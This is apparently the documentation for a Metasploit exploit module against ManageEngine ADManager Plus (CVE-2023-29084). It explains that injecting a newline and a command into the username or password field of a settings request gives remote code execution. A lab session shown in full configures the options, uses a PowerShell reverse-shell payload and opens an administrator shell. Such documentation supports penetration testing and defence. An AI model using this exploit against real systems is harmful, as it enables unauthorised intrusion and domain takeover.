## Vulnerable Application
ManageEngine ADManager Plus prior to build 7181 is vulnerable to an authenticated command injection due to insufficient
validation of user input when performing the `ChangePasswordAction` function before passing it into a string that is later
used as an OS command to execute. 

By making a POST request to `/api/json/admin/saveServerSettings` with a `params` POST
parameter containing a JSON array object that has a `USERNAME` or `PASSWORD` element containing a 
carriage return and newline, followed by the command the attacker wishes to execute, an attacker can gain RCE as the user
running ADManager Plus, which will typically be the local administrator. 

Note that the attacker must be authenticated in order to send requests to `/api/json/admin/saveServerSettings`, 
so this vulnerability does require authentication to exploit.

## Verification Steps

1. Set up a Windows Server target as a domain controller server.
2. Download https://web.archive.org/web/20220926012908if_/https://download.manageengine.com/products/ad-manager/13024552/ManageEngine_ADManager_Plus_64.exe onto the target and run through the setup window, accepting defaults.
3. Start `msfconsole`
4. `set RHOST *target IP*`
5. `set LHOST *local IP address*`
6. `set SRVHOST *local IP address*` <- This step is optional depending on payload.
7. `exploit`
8. You should get a shell back as the local administrator user on the target machine.

## Options

### USERNAME
Username to log into ADManager Plus as.

### PASSWORD
Password to log into ADManager Plus with.

### DOMAIN
Domain to log into ADManager Plus with or `ADManager Plus Authentication`.

## Scenarios

### ManageEngine ADManager Plus Build 7151 on Windows Server 2022
```
msf6 exploit(windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection) > show options

Module options (exploit/windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  admin            yes       The password to log in with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    192.168.64.137   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     8080             yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)
   USERNAME  admin            yes       The user to log into ADManager Plus as
   VHOST                      no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  192.168.64.128   yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         192.168.64.128   yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         8899             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection) > exploit

[*] Started reverse TCP handler on 192.168.64.128:8899 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is running AdManager Plus build 7151!
[+] The target appears to be vulnerable. Target appears to be running a vulnerable version of AdManager Plus!
[+] Logged in successfully!
[*] Powershell session session 2 opened (192.168.64.128:8899 -> 192.168.64.137:52930) at 2023-05-23 13:34:34 -0500
[*] Stopping exploit/multi/handler
[+] Request timed out. Its likely the payload executed successfully!

PS C:\Program Files\ManageEngine\ADManager Plus\bin> whoami    
daforest\administrator
PS C:\Program Files\ManageEngine\ADManager Plus\bin> background

Background session 2? [y/N]  y
msf6 exploit(windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection) > sessions

Active sessions
===============

  Id  Name  Type                Information                      Connection
  --  ----  ----                -----------                      ----------
  2         powershell windows  Administrator @ WIN-E72FSF87GO1  192.168.64.128:8899 -> 192.168.64.137:52930 (192.168.64.137)

msf6 exploit(windows/http/manageengine_admanager_plus_cve_2023_29084_auth_cmd_injection) > 
```
